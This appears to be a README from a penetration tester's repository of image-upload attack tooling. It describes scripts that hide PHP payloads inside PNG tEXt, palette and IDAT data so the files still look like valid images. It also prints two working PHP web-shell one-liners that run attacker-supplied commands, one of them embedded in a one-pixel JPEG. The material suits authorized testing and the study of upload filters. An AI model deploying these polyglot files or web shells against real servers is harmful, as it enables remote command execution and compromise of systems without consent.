# Image Upload Payloads and Scripts

This directory contains my payloads and scripts related to image upload vulnerabilities.

## Scripts

- **generate_tEXtPNG.php**  
  Takes 3 parameters: a PNG image, a PHP payload, and an output name.  
  Creates a new PHP file with a valid PNG structure that embeds the payload inside a custom `tEXt` chunk called `"synackt"`.

- **generatePLTE.php**  
  Takes 2 parameters: a PHP payload and an output name.  
  Creates a new PHP file with a valid PNG structure that hides the payload inside its palette (`PLTE`) instructions.

- **generateIDAT.php**  
  Very specific script.  
  Produces a `110x110` PNG image that, once resized to `55x55`, contains the exact PHP payload:  
  ```php
  <?=$_GET[0]($_POST[1]);?>

## Payloads

- **magicOnly.jpg**  
  A minimal, one-pixel JPEG image.  
  It contains the following PHP payload inside:
  
  ```php
  <?php echo system($_GET['cmd']); ?>
